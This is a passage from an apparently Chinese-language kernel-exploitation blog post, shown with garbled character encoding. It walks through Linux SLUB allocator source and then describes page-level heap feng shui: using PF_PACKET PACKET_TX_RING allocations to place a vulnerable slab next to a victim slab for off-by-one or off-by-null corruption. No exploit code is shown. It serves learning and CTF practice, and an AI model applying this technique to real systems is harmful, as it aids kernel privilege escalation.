class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯æœ€ç»ˆè®¡ç®—å‡º<code>order</code>çš„å‡½æ•°äº†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šä»slabæ‰€éœ€è¦çš„æœ€å°orderåˆ°æœ€å¤§orderä¹‹é—´å¼€å§‹éå†ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿä½¿slabç¢ç‰‡æœ€å°çš„orderå€¼ã€‚è€Œremåˆ™æ˜¯slabçš„ç¢ç‰‡å¤§å°ï¼šåˆ†é…å®Œobjectä¹‹åï¼Œæ‰€äº§ç”Ÿçš„ç¢ç‰‡å¤§å°ã€‚ç¢ç‰‡å¤§å°remä¸èƒ½è¶…è¿‡<code>slab_size / fract_leftover</code>å³ç¬¦åˆè¦æ±‚ã€‚</p><p>è¿™é‡Œçš„<code>get_order</code>å‡½æ•°ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œ<del>è¿™ç‹—å±ç©æ„ï¼Œå¼€å§‹çœ‹é”™äº†æ–‡ä»¶å¯¼è‡´ä¸€ç›´çœ‹ä¸æ‡‚ï¼Œç¡¬ç”Ÿç”Ÿçœ‹äº†ä¸¤ä¸ªå°æ—¶æ‰ååº”è¿‡æ¥äº†</del>ã€‚ä¹Ÿå°±æ˜¯æ ¹æ®sizeè¿”å›å¯¹åº”çš„æœ€å°çš„<code>order</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¦‚æœæ ¹æ®ä¸Šä¸€ä¸ªå‡½æ•°ä¸­çš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>æ¥çœ‹çš„è¯ï¼Œæœ€ç»ˆè¿”å›çš„<code>order</code>ä¹Ÿå°±æ˜¯3ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache_order_objects <span class="title">oo_make</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">x</span> =</span> &#123;</span><br><span class="line">(order &lt;&lt; OO_SHIFT) + order_objects(order, size)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åç”±<code>oo_make</code>å‡½æ•°å†™å…¥åˆ°ooæˆå‘˜ä¸­å»äº†ã€‚</p><h3 id="kmem-cache-allocæµç¨‹"><a href="#kmem-cache-allocæµç¨‹" class="headerlink" title="kmem_cache_allocæµç¨‹"></a>kmem_cache_allocæµç¨‹</h3><p>å¯ä»¥çœ‹åˆ°å‰é¢<code>kmem_cache_create_usercopy</code>å‡½æ•°åªæ˜¯å¯¹<code>kmem_cache</code>ç»“æ„ä½“é‡Œé¢çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼ï¼Œå¹¶æ²¡æœ‰å®è´¨æ€§çš„ç”Ÿæˆslabã€‚è€ŒçœŸæ­£åˆ†é…slabæ˜¯åœ¨ç¬¬ä¸€æ¬¡å¯¹è¿™ä¸ªcacheç”³è¯·objectçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå°æ ‡é¢˜çš„å‡½æ•°ã€‚</p><p>è¿™é‡Œçš„è°ƒç”¨æµç¨‹å°±æ˜¯ï¼š<code>kmem_cache_alloc</code>=&gt;<code>__kmem_cache_alloc_lru</code>=&gt;<code>slab_alloc</code>=&gt;<code>slab_alloc_node</code>=&gt;<code>__slab_alloc_node</code>=&gt;<code>new_slab</code>=&gt;<code>allocate_slab</code>=&gt;<code>alloc_slab_page</code></p><h4 id="slab-alloc-nodeå‡½æ•°"><a href="#slab-alloc-nodeå‡½æ•°" class="headerlink" title="__slab_alloc_nodeå‡½æ•°"></a>__slab_alloc_nodeå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">object = get_partial(s, node, &amp;pc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">object = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ†é…é¡ºåºå°±æ˜¯é¦–å…ˆè®¿é—®<code>partial</code>æŒ‡é’ˆä¸­ï¼Œå¦‚æœå…¶ä¸­æ²¡æœ‰å¯ä»¥è¿”å›çš„objectå°±ä¼šæ‰§è¡Œåˆ°<code>new_slab</code>å‡½æ•°åˆ†é…æ–°çš„slabã€‚</p><h4 id="alloc-single-from-new-slabå‡½æ•°"><a href="#alloc-single-from-new-slabå‡½æ•°" class="headerlink" title="alloc_single_from_new_slabå‡½æ•°"></a>alloc_single_from_new_slabå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">alloc_single_from_new_slab</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">int</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nid = slab_nid(slab);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, nid);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = get_freepointer(s, object);</span><br><span class="line">slab-&gt;inuse = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!alloc_debug_processing(s, slab, object, orig_size))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s not really expected that this would fail on a</span></span><br><span class="line"><span class="comment"> * freshly allocated slab, but a concurrent memory</span></span><br><span class="line"><span class="comment"> * corruption in theory could cause that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;inuse == slab-&gt;objects)</span><br><span class="line">add_full(s, n, slab);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_HEAD);</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, nid, slab-&gt;objects);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åšçš„äº‹å°±æ˜¯é¦–å…ˆå–ä¸‹<code>freelist</code>æŒ‡å‘çš„objectï¼Œéšåå°†slabæ·»åŠ åˆ°<code>partial</code>æŒ‡é’ˆå¤„ã€‚</p><h4 id="allocate-slabå‡½æ•°"><a href="#allocate-slabå‡½æ•°" class="headerlink" title="allocate_slabå‡½æ•°"></a>allocate_slabå‡½æ•°</h4><p>ä¸Šé¢æåˆ°äº†<code>new_slab</code>å‡½æ•°ï¼Œå…¶å®å®è´¨ä¸Šè°ƒç”¨çš„æ˜¯è¿™ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct slab *<span class="title">allocate_slab</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp;</span><br><span class="line"><span class="keyword">void</span> *start, *p, *next;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">oo = s-&gt;min;</span><br><span class="line">alloc_gfp = flags;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment"> * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">stat(s, ORDER_FALLBACK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab-&gt;objects = oo_objects(oo);</span><br><span class="line">slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line">shuffle = shuffle_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!shuffle) &#123;</span><br><span class="line">start = fixup_red_left(s, start);</span><br><span class="line">start = setup_object(s, start);</span><br><span class="line">slab-&gt;freelist = start;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) &#123;</span><br><span class="line">next = p + s-&gt;size;</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, p, next);</span><br><span class="line">p = next;</span><br><span class="line">&#125;</span><br><span class="line">set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹äºæ–°åˆ†é…çš„slabé¦–å…ˆå†™çš„å°±æ˜¯ä»–çš„<code>freelist</code>æŒ‡é’ˆï¼Œæ‰€ä»¥æ ¹æ®ä¸Šé¢å¤–å±‚å‡½æ•°çš„è°ƒç”¨é¡ºåºæ¥çœ‹ï¼Œåœ¨åˆšæŒ‚è½½åˆ°<code>freelist</code>ç´§æ¥ç€å°±ä¼šè¿”å›objectå¹¶é‡æ–°æŒ‚è½½åˆ°<code>partial</code>ä¸Šã€‚</p><p>ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†åœ¨slabåˆ†é…åˆ†æå¼€å¤´ç»™å‡ºçš„å‡½æ•°<code>alloc_slab_page</code>ã€‚</p><h2 id="é¡µçº§å †é£æ°´æ„é€ "><a href="#é¡µçº§å †é£æ°´æ„é€ " class="headerlink" title="é¡µçº§å †é£æ°´æ„é€ "></a>é¡µçº§å †é£æ°´æ„é€ </h2><p>ç»ˆäºè¦è¯´åˆ°è·Ÿé¢˜ç›®æœ‰å…³ç³»çš„å†…å®¹äº†ã€‚</p><p>å¦‚æœæåˆ°ä¸€ä¸ªé©±åŠ¨å­˜åœ¨<code>off by null</code>æˆ–è€…<code>off by one</code>æ¼æ´æ—¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯è¿™ä¸ª<a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a>ä¸­çš„åŠæ³•ï¼Œä½¿ç”¨å¤§é‡å †å–·æ¥å®Œæˆã€‚ä½†æ˜¯å¦‚æœé¢˜ç›®çš„slabæ˜¯ç”±<code>kmem_cache_create_usercopy</code>åˆ›å»ºçš„è¯å›°éš¾å°±ä¼šå­˜åœ¨å¾ˆå¤§çš„é—®é¢˜äº†ï¼Œå¦‚æœä½ å½“å‰ä½¿ç”¨å †å–·çš„å †å—çš„orderä¸åˆ›å»ºçš„cacheä¸ä¸€è‡´ï¼Œè¿™æ ·åªæœ‰æä½çš„æ¦‚ç‡å¯ä»¥è®©é©±åŠ¨ç”Ÿæˆçš„slabç´§é‚»å †å–·çš„slabã€‚æ‰€ä»¥ä¸ºäº†æé«˜è„šæœ¬çš„ç¨³å®šæ€§ï¼Œå‡ºç°äº†è¿™ä¸€åˆ©ç”¨æ‰‹æ³•ã€‚</p><p>å…¶å®è¿™ä¸€æ‰‹æ³•ä»¥å‰åœ¨å®‰å…¨å®¢ä¸­æœ‰çœ‹åˆ°ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰åœ¨æ„ï¼Œæ‰€ä»¥ç°åœ¨å€Ÿç€å¢¨æ™šé¸¢ä½¬çš„åšå®¢å­¦ä¹ ä¸€ä¸‹ã€‚é¡µçº§å †é£æ°´å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ ¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒã€‚</p><p>åœ¨ä¸Šè¿°è§£é‡Šå®Œslabçš„åˆ†é…è¿‡ç¨‹æƒ³å¿…åº”è¯¥éƒ½èƒ½ç†è§£<code>buddy system</code>äº†ï¼Œä»–çš„åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼ˆå·çš„å›¾ï¼‰ï¼š</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/79biltjNfACIZcP.gif"                      alt="å·"                ></p><p>ä¸éš¾æƒ³åˆ°è¿™ä¸ªåˆ©ç”¨æ–¹å¼çš„åŸç†å°±æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µæ˜¯ç‰©ç†è¿ç»­çš„ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p><ul><li>  å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li><li>  é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåˆ†é… <code>vulnerable kmem_cache</code> ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li><li>  é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œä½¿ç”¨ <code>victim kmem_cache</code> å †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li></ul><p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vulnerable kmem_cache</code>çš„<code>off by null</code>æˆ–<code>off by one</code>å»ä¿®æ”¹åˆ°<code>victim kmem_cache</code>äº†ã€‚</p><h3 id="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"><a href="#åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page" class="headerlink" title="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"></a>åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page</h3><p>æ ¹æ®ä¸Šè¿°å†…å®¹æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ¶ˆè€—æ‰å°<code>order</code>çš„é¡µé¢æ‰èƒ½ç»§ç»­è¿›è¡Œï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä»¥ç”³è¯·æŒ‡å®š<code>order</code>çš„APIã€‚è¿™é‡Œé€‰æ‹©æ˜¯<a class="link"   href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >CVE-2017-7308<i class="fas fa-external-link-alt"></i></a>ä¸­çš„æ–¹æ³•ã€‚</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>protocol</code> ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º <code>TPACKET_V1 </code>/ <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><p><code>__sys_setsockopt</code>=&gt;<code>sock-&gt;ops-&gt;setsockopt</code>=&gt;<code>packet_setsockopt</code>=&gt;<code>packet_set_ring</code>=&gt;<code>alloc_pg_vec</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line"><span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">pg_vec = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™é‡Œ<code>alloc_pg_vec</code>å‡½æ•°é€šè¿‡<code>alloc_one_pg_vec_page</code>å‡½æ•°ç”³è¯·bufferã€‚å¹¶ä¸”è¿™é‡Œç”³è¯·çš„æ•°é‡ä¸º<code>req-&gt;tp_block_nr</code>è€Œreqæ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œç”³è¯·çš„æ•°é‡æ˜¯å¯æ§çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line"><span class="keyword">if</span> (buffer)</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* complete and utter failure */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>alloc_one_pg_vec_page</code>å‡½æ•°ä½¿ç”¨<code>__get_free_pages</code>ç”³è¯·åˆ°pageã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 